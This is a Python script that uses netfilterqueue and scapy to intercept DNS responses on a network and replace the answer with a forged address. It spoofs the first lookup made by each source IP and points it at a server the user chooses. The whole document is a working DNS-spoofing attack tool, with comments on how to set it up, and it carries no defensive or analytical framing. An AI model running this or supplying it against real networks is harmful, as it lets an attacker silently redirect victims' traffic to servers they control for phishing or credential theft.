#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy

spoofed_ips = set()

def process_packet(packet):
    # convert the NetFilter packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    src_ip = scapy_packet.src
    # check if the request has a DNS Resource Record and a qname in a DNS Question Record (containing the requested URL)
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        # spoof only for first site request per IP
        if src_ip not in spoofed_ips:
            # forge the Response and inject it
            # replace with your webserver's IP
            answer = scapy.DNSRR(rrname=qname, rdata="1.2.3.4")
            scapy_packet[scapy.DNS].an = answer
            # set the number of answers according to the forged Responses number
            scapy_packet[scapy.DNS].ancount = 1
            # delete the checksum and the length values of the forged packet to avoid packet corruption
            # remove these fields from both IP and Transport headers, considering DNS TCP fallback
            # scapy recalculates these values
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            if scapy_packet.haslayer(scapy.TCP):
                del scapy_packet[scapy.TCP].len
                del scapy_packet[scapy.TCP].chksum

            #reconvert the scapy packet
            packet.set_payload(bytes(scapy_packet))
            spoofed_ips.add(src_ip)
            print(f"\n[+] Spoofed first request of {src_ip} for {qname}")
        else:
            print(f"\n[+] Accepted unmodified request from {src_ip} for {qname}")
    
    # .drop or .accept the packet
    packet.accept()

# create the object, bind to the iptables command and run
queue = netfilterqueue.NetfilterQueue()
queue.bind(1337, process_packet)
try:
    print("[*] Starting packet interception. Press Ctrl+C to stop.")
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Keyboard Interrupt detected. Exiting gracefully.")
    print("\n[*] Spoofed IP addresses:")
    for ip in spoofed_ips:
        print(f"\n - {ip}")
